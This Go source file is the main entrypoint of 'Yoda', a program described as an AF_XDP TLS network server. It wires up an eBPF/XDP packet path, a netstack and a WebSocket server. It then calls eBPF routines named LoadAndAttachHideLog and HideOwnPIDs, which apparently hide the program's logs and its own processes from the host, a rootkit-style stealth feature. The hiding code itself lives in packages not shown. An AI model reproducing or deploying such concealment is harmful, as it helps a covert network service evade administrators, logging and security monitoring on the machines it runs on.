// Yoda TLS AF_XDP Network Server main entrypoint

package main

import (
	"log"
	"os"
	"os/signal"
	"syscall"

	cfg "github.com/cezamee/Yoda/internal/config"
	"github.com/cezamee/Yoda/internal/core"
	"github.com/cezamee/Yoda/internal/core/ebpf"

	"github.com/cilium/ebpf/rlimit"
)

func main() {
	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatalf("Failed to remove memlock: %v", err)
	}

	coll, _, _, statsMap, cb, l, srcMAC, queueID := ebpf.InitializeXDP(cfg.InterfaceName)
	defer coll.Close()
	defer l.Close()

	netstackStack, linkEP := core.CreateNetstack()

	bridge := &cfg.NetstackBridge{
		Cb:       cb,
		QueueID:  queueID,
		Stack:    netstackStack,
		LinkEP:   linkEP,
		StatsMap: statsMap,
		SrcMAC:   srcMAC,
	}

	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	go func() {
		core.StartPacketProcessing(bridge)
	}()

	go func() {
		core.SetupWebSocketServer(bridge)
	}()

	exit, err := ebpf.LoadAndAttachHideLog()
	if err != nil {
		log.Fatal(err)
	}
	defer ebpf.CloseLinks(exit)

	enter, exit, err := ebpf.HideOwnPIDs()
	if err != nil {
		log.Fatal(err)
	}
	defer ebpf.CloseLinks(enter, exit)

	<-c
}
